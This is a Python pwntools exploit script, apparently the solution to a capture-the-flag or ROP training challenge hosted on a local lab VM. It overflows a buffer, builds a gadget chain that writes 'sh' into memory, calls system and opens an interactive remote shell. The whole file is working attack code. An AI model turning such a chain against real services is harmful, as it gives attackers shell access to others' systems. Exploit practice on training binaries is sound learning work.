#!/usr/bin/env python2
'''
Put 'sh\x00\x00' into edx
Write the data in edx into the address stored in ecx
'''
from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)


# useful address
bss_section = p32(0x0804a040)
system_plt = p32(0x08048430)

# gadgets
mov_lecx_edx = p32(0x08048693) # pop ebp; pop ebx; xor byte[ecx], bl; ret
xor_edx_edx = p32(0x08048671) # pop esi; mov ebp,0xcafebabe; ret
xor_edx_ebx = p32(0x0804867b) # pop ebp; mov edi,0xdeadbabe; ret
xchg_edx_ecx = p32(0x08048689) # pop ebp; mov edx,0xdefaced0; ret
pop_ebx = p32(0x08048716)

# payload
buf = "A"*44
buf += xor_edx_edx
buf += "AAAA" # get rid of pop esi
buf += pop_ebx
buf += bss_section
buf += xor_edx_ebx
buf += "AAAA" # get rid of pop ebp
buf += xchg_edx_ecx # put bss_section into ecx
buf += "AAAA" # get rid of pop ebp
buf += xor_edx_edx
buf += "AAAA"
buf += pop_ebx
buf += "sh\x00\x00"
buf += xor_edx_ebx
buf += "AAAA"
buf += mov_lecx_edx # write 'sh\x00\x00' into bss_section
buf += "AAAA"
buf += p32(0) # get rid of pop ebx
buf += system_plt
buf += "AAAA"
buf += bss_section


print p.recvuntil('>')
p.sendline(buf)
p.interactive()
